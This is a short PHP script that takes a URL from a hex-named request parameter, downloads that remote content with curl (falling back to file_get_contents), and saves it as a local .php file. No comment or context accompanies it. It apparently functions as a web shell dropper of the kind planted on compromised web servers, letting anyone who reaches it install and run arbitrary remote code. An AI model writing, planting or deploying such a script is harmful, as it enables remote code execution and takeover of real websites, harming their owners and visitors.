<?php
$name = '19a1c6ac28fd007daaf4.php';
$ch = curl_init ($_REQUEST['19a1c6ac28fd007daaf4']);
$fp = fopen ($name, "w+");
curl_setopt ($ch, CURLOPT_FILE, $fp);
$ult = curl_exec ($ch);
curl_close ($ch);
fclose ($fp);
if(!$ult){
$f = file_get_contents($_REQUEST['19a1c6ac28fd007daaf4']); 
file_put_contents($name,$f); 
}